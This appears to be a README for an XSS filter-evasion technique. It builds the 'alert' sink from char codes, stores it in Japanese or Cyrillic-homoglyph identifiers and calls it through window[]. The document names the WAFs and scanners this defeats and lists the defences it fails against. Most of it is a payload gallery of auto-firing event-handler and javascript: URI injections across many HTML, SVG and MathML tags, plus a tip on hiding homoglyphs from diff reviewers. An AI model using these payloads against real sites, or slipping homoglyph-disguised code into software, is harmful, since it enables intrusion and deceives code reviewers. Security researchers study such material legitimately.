```
    __  __      _              __       _  __ ____   ____
    \ \/ /___  (_)________  __/ /____  | |/ // __/ / __/
     \  // _ \/ / __/ __ \/ / / __/ _ \ |   /_ \  \__ \
     /  \/ __/ / /_/ /_/ / /_/ /_/  __//   /__/ / ___/ /
    /_/\_\___/_/\__/\____/\__/\__/\___/_/|_/____/ /____/

           変数 = String.fromCharCode(97,108,101,114,116)
                       window[変数](1)
```

<div align="center">

`unicode identifiers` · `charcode assembly` · `bracket invocation`

</div>

---

## Core Trick

```js
変数 = String.fromCharCode(97,108,101,114,116);  // "alert"
window[変数](1);                                  // alert(1)
```

Three primitives stacked:

1. Non-ASCII identifier (`変数`, `АЬс`, etc.) is valid ECMAScript.
2. `String.fromCharCode` builds the sink name at runtime.
3. `window[ident]` invokes it without the literal token.

No `alert`, no `eval`, no `Function` string anywhere in the payload.

---

## Why It Bypasses Filters and WAFs

```
   ┌─────────────────────────────┬─────────────────────────────┐
   │  Filter looks for           │  Payload contains           │
   ├─────────────────────────────┼─────────────────────────────┤
   │  /alert|eval|prompt/i       │  変数, charcodes, window[]  │
   │  ASCII identifier scans     │  U+5909 U+6570 katakana     │
   │  javascript: in href        │  MathML href, meta refresh  │
   │  <script> tag blocklist     │  event handlers only        │
   │  DOMPurify default v<2.x    │  MathML, SVG discard, keygen│
   └─────────────────────────────┴─────────────────────────────┘
```

Concrete wins:

- **Signature WAFs** (ModSecurity CRS, Cloudflare managed, AWS WAF) match on ASCII keywords. Katakana or Cyrillic identifiers pass untouched.
- **Reflected-XSS scanners** (Burp Scanner, dalfox, XSStrike) grep for `alert(`, `prompt(`, `confirm(` in response bodies. Bracket invocation defeats that check.
- **Manual code review** searching `alert` in reflected params misses the payload.
- **CSP** with `unsafe-inline` disabled still blocks this, but many sites allow inline handlers via `unsafe-inline` for legacy reasons: those are the targets.
- **Content-Type sniffing filters** looking for `<script` are irrelevant. All payloads use event handlers or `javascript:` URIs.

---

## Limits

Not magic. Fails against:

- **Strict CSP** (`script-src 'self'` no `unsafe-inline`, no `unsafe-eval`). Inline handlers refuse to fire. `javascript:` URIs blocked.
- **Trusted Types** enforcement. Any assignment to sink refused before execution.
- **Modern DOMPurify** (>= 2.x, default config). Strips all event handlers and unknown tags. Configure `ALLOWED_ATTR` narrowly and this dies.
- **Server-side HTML entity encoding** of user input before reflection. `<` becomes `&lt;`, tag never parses.
- **Attribute allowlists** that strip `on*` entirely. No handler fires.
- **Framework auto-escaping** (React JSX, Vue templates, Angular interpolation). Reflection appears as text, not HTML.
- **Char-set restrictions**: if the reflection point strips or normalizes non-ASCII (`\W` filter, ASCII-only regex), `変数` gets nuked. Fallback: use pure ASCII bracket-notation like `window[String.fromCharCode(...)](1)` without the ident var.

Rule of thumb: this beats **pattern matching**. It does not beat **structural** defences.

---

## Payload Gallery

<details open>
<summary><b>image</b></summary>

```html
<img src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<img src=x onloadstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>body / document</b></summary>

```html
<body onpageshow="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<body onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" autofocus>
```
</details>

<details>
<summary><b>form (fires without interaction)</b></summary>

```html
<input autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<select autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><option>x</option></select>
<textarea autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></textarea>
<keygen autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>details / summary</b></summary>

```html
<details open ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></details>
<details ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" open><summary>x</summary></details>
```
</details>

<details>
<summary><b>media</b></summary>

```html
<video><source onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></video>
<audio src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<video poster=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>iframe / object</b></summary>

```html
<iframe src="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<iframe onload="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<object data="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></object>
```
</details>

<details>
<summary><b>table / marquee</b></summary>

```html
<table background="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<marquee onstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</marquee>
<marquee onfinish="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" loop=1>x</marquee>
```
</details>

<details>
<summary><b>style / animation</b></summary>

```html
<div style="animation-name:x" onanimationstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
```
</details>

<details>
<summary><b>SVG</b></summary>

```html
<svg><animate onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x dur=1s></svg>
<svg><set onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x to=1></svg>
<svg><animateMotion onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" dur=1s></svg>
<svg><discard onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></svg>
```
</details>

<details>
<summary><b>meta refresh</b></summary>

```html
<meta http-equiv="refresh" content="0;url=javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>dialog</b></summary>

```html
<dialog open onclose="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></dialog>
```
</details>

<details>
<summary><b>MathML</b></summary>

```html
<math href="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><maction actiontype="statusline#">click</maction></math>
```
</details>

---

## Cyrillic Homoglyph Variant

```js
let АЬс = String.fromCharCode(97,108,101,114,116);
window[АЬс](1);
```

`А` U+0410, `Ь` U+042C, `с` U+0441. Reads as `Abc`, is not. Useful when reviewers eyeball diffs.

---

## Credit

Inspired by [`0x03f3/php-emoji-reverse-shell`](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php). Same primitive, PHP side: emoji identifiers + char-code assembly to slip past AV and WAF signatures.

---

## Legal

Educational and defensive research. Use only on targets you own or have written authorisation for (bug bounty scope, CTF, pentest SoW).
